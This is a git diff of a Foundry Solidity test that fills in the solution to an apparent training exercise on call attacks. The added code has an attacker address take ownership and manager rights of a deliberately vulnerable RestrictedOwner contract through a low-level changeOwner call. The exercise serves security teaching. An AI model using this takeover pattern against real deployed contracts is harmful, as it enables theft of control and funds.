@@ -10,14 +10,13 @@ import "src/call-attacks-1/UnrestrictedOwner.sol";
  * @dev run "forge test -vvv --match-contract CA1"
  */
 contract TestCA1 is Test {
-
     address deployer = makeAddr("deployer");
     address user = makeAddr("user");
     address attacker = makeAddr("attacker");
 
     UnrestrictedOwner unrestrictedOwner;
-	RestrictedOwner restrictedOwner;
-    
+    RestrictedOwner restrictedOwner;
+
     function setUp() public {
         /* SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
         vm.startPrank(deployer);
@@ -38,9 +37,19 @@ contract TestCA1 is Test {
     }
 
     function testCallAttack1() public {
-        /** CODE YOUR SOLUTION HERE */
-        
-        /** SUCCESS CONDITIONS - DON'T CHANGE ANYTHING HERE */
+        /**
+         * CODE YOUR SOLUTION HERE
+         */
+        vm.startPrank(attacker);
+        unrestrictedOwner.changeOwner(attacker);
+        (bool success,) = address(restrictedOwner).call(abi.encodeWithSignature("changeOwner(address)", attacker));
+        require(success, "Call Failed 1");
+
+        restrictedOwner.updateSettings(attacker, attacker);
+
+        /**
+         * SUCCESS CONDITIONS - DON'T CHANGE ANYTHING HERE
+         */
         assertEq(restrictedOwner.owner(), attacker);
         assertEq(restrictedOwner.manager(), attacker);
     }
